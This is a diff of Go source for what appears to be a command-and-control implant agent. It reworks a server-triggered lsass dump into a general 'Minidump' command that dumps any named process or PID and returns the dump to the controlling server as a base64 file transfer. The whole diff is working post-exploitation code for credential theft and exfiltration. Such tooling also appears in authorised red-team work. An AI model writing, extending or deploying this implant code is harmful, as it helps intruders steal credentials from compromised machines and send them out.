@@ -36,6 +36,7 @@ import (
 	"path/filepath"
 	"runtime"
 	"strconv"
+	"strings"
 	"time"
 
 	// 3rd Party
@@ -549,28 +550,49 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 			if a.Verbose {
 				message("note", "Received Server OK, doing nothing")
 			}
-		case "AgentControl":
+		case "Module":
 			if a.Verbose {
-				message("note", "Received Agent Control Message")
+				message("note", "Received Agent Module Directive")
 			}
-			var p messages.AgentControl
+			var p messages.Module
 			json.Unmarshal(payload, &p)
-
 			switch p.Command {
-			case "lsassdump":
+			case "Minidump":
 				if a.Verbose {
-					message("note", "Received dump lsass request")
+					message("note", "Received Minidump request")
 				}
-				//get lsass minidump
-				fileData, fileDataErr := dumpLsass()
+				//ensure the provided args are valid
+				if len(p.Args) < 1 {
+					//not enough args
+					message("warn", fmt.Sprintf("Not enough args were provided to dump a process"))
+					break
+				}
+				process := p.Args[0] //string TODO: do some validation here I guess
+				//clean the arg - for some reason spaces at the start?
+				process = strings.Trim(process, " ")
+				pid := uint32(0)
+				if len(p.Args) > 1 {
+					//clean the arg - for some reason spaces at the start?
+					p.Args[1] = strings.Trim(p.Args[1], " ")
+					pidInt, err := strconv.ParseInt(p.Args[1], 0, 32)
+					if err != nil {
+						//probably not well formatted number
+						message("warn", fmt.Sprintf("Could not parse pid value:"+p.Args[1]))
+						message("warn", fmt.Sprintf(err.Error()))
+						break
+					}
+					pid = uint32(pidInt)
+				}
+				//get minidump
+				fileData, fileDataErr := miniDump(process, pid)
 
 				//copied and pasted from upload func, modified appropriately
 				if fileDataErr != nil {
 					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error dumping lsass"))
+						message("warn", fmt.Sprintf("There was an error dumping the process"))
 						message("warn", fmt.Sprintf("%s", fileDataErr.Error()))
 					}
-					errMessage := fmt.Sprintf("There was an error dumping lsass\r\n")
+					errMessage := fmt.Sprintf("There was an error dumping the process\r\n")
 					errMessage += fileDataErr.Error()
 					c := messages.CmdResults{
 						Job:    p.Job,
@@ -594,7 +616,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 							fileHash.Sum(nil)))
 					}
 					c := messages.FileTransfer{
-						FileLocation: "lsass.dmp",
+						FileLocation: process + ".dmp",
 						FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
 						IsDownload:   true,
 						Job:          p.Job,
@@ -614,6 +636,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 						message("warn", "There was an error sending the FileTransfer message to the server")
 						message("warn", fmt.Sprintf("%s", respErr.Error()))
 					}
+					break //resolves crash on error
 				}
 				if resp2.StatusCode != 200 {
 					if a.Verbose {
@@ -621,6 +644,15 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					}
 				}
 
+			}
+		case "AgentControl":
+			if a.Verbose {
+				message("note", "Received Agent Control Message")
+			}
+			var p messages.AgentControl
+			json.Unmarshal(payload, &p)
+
+			switch p.Command {
 			case "kill":
 				if a.Verbose {
 					message("note", "Received Agent Kill Message")
